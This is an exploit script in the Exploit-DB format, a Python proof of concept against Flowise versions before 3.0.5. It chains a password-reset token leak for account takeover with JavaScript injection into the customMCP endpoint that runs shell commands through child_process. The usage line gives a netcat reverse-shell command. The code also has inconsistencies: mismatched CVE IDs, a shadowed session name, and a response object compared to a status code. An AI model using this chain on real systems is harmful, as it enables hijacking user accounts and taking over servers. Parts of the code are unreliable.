# Exploit Title: Flowise < 3.0.5 - ATO + RCE
# Date: 10/11/2025
# Exploit Author: nltt0
# Vendor Homepage: https://flowiseai.com/
# Software Link: https://github.com/FlowiseAI/Flowise
# Version: < 3.0.5
# CVE-2025-58434 & CVE-2025-59528 (chain)
# Requirements: Know an email registered in the application
# Usage: python flowise-rce-3.0.5.py --email xtz@local --newpassword Test@2025 --url http://localhost:3000 --cmd "nc localhost 1337 -e sh"

from requests import post, session
from argparse import ArgumentParser

banner = r"""
_____       _                              _____ 
/  __ \     | |                            /  ___|
| /  \/ __ _| | __ _ _ __   __ _  ___  ___ \ `--. 
| |    / _` | |/ _` | '_ \ / _` |/ _ \/ __| `--. \
| \__/\ (_| | | (_| | | | | (_| | (_) \__ \/\__/ /
\____/\__,_|_|\__,_|_| |_|\__, |\___/|___/\____/ 
                            __/ |                 
                          |___/                  
                
        by nltt0 [https://github.com/nltt-br]

"""

try:
    parser = ArgumentParser(description='CVE-2025-58434 & CVE-2025-61687 [FlowiseAI 3.0.5]', usage="python flowise-rce-3.0.5.py --email xtz@local --newpassword Test@2025 --url http://localhost:3000 --cmd \"http://localhost:1337/`whoami`\"")
    parser.add_argument('-e', '--email', required=True, help='Registered email')
    parser.add_argument('-p', '--newpassword', required=True)
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', required=True)

    args = parser.parse_args()
    email = args.email
    password = args.newpassword
    url = args.url
    cmd = args.cmd

    def main():

        def login(email, url):
                session = session()
                url_format = "{}/api/v1/auth/login".format(url)
                headers = {"x-request-from": "internal", "Accept-Language": "pt-BR,pt;q=0.9", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Origin": "http://workflow.flow.hc", "Referer": "http://workflow.flow.hc/signin", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}
                data={"email": email, "password": password}
                response = session.post(url_format, headers=headers, json=data)
                return session, response

        def account_takeover(email, url, password):
            def check_if_account_exist():
                session,response = login(email, url)
                return response.status_code

            def reset_password():
                status_code = check_if_account_exist()
                
                if status_code != 200:
                    headers = {
                        'Content-Type': 'application/json'
                    }

                    data = {
                        'user': {'email': email}
                    }

                    url_format = '{}/api/v1/account/forgot-password'.format(url)
                    response = post(url_format, headers=headers, json=data)

                    if response.status_code == 201:
                        responsef_json = response.json()
                        temp_token = responsef_json['user']['tempToken']

                        data = {
                            'user': {'email': email,
                                    'tempToken': temp_token,
                                    "password": password
                                    }
                        }
                        url_format0 = '{}/api/v1/account/reset-password'.format(url)
                        response = post(url_format0, headers=headers, json=data)
                        print('[x] Password changed')
                    
                    else:
                        print('[x] Unregistered user')

            reset_password()

        def rce(email, url, password, cmd):

            account_takeover(email, url, password)

            session, status_code = login(email, url)

            if status_code == 200:

                url_format = "{}/api/v1/node-load-method/customMCP".format(url)

                command = f'({{x:(function(){{const cp = process.mainModule.require("child_process");cp.execSync("{cmd}");return 1;}})()}})'
                data = {
                    "loadMethod": "listActions",
                    "inputs": {
                        "mcpServerConfig": command
                    }
                }

                response = session.post(url_format, json=data)

                if response.status_code == 401:
                    session.headers["x-request-from"] = "internal"
                    session.post(url_format, json=data)

                print(f"[x] Command executed [{cmd}]")    

        rce(email, url, password, cmd)

except Exception as e:
    print('Error in {}'.format(e))


if __name__ == '__main__':
    main()